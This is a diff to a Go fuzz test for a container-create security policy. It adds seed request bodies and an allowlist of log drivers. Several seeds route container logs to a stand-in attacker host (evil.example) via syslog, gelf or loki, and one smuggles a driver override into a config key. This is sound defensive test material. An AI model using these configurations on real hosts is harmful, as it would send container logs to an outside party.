@@ -81,6 +81,11 @@ func FuzzContainerCreate(f *testing.F) {
 	f.Add([]byte(`{"HostConfig":{"Mounts":[{"Type":"volume","Source":"vol","VolumeOptions":{"DriverConfig":{"Name":"local","Options":{"device":"/dev/../dev/sda1"}}}}]}}`))
 	f.Add([]byte(`{"HostConfig":{"Mounts":[{"Type":"volume","Source":"vol","VolumeOptions":{"DriverConfig":{"Name":"local","Options":{"type":"btrfs","o":"rw,device=/dev/sdb"}}}}]}}`))
 	f.Add([]byte(`{"HostConfig":{"Mounts":[{"Type":"volume","Source":"vol","VolumeOptions":{"DriverConfig":{"Name":"local","Options":{"type":"nfs","o":"addr=1.2.3.4","device":":/exports/data"}}}}]}}`))
+	// Log driver seeds, run against the strict policy's allowed_log_drivers.
+	f.Add([]byte(`{"HostConfig":{"LogConfig":{"Type":"syslog","Config":{"syslog-address":"tcp://evil.example:514"}}}}`))
+	f.Add([]byte(`{"HostConfig":{"LogConfig":{"Type":"json-file","Config":{"Driver":"gelf","GELF-ADDRESS":"udp://evil.example:12201"}}}}`))
+	f.Add([]byte(`{"HostConfig":{"LogConfig":{"Type":"json-file","Config":{"driver=fluentd":"x","max-size":"10m"}}}}`))
+	f.Add([]byte(`{"HostConfig":{"LogConfig":{"Type":"","Config":{"loki-url":"https://evil.example/loki/api/v1/push"}}}}`))
 
 	// permissive policy: exercises JSON decode and existing checks.
 	policy := newContainerCreatePolicy(ContainerCreateOptions{
@@ -95,6 +100,7 @@ func FuzzContainerCreate(f *testing.F) {
 		DenySelinuxDisable:        true,
 		DenySelinuxLabelOverride:  true,
 		DenyUnconfinedSystemPaths: true,
+		AllowedLogDrivers:         []string{"json-file", "local"},
 	})
 
 	f.Fuzz(func(t *testing.T, body []byte) {
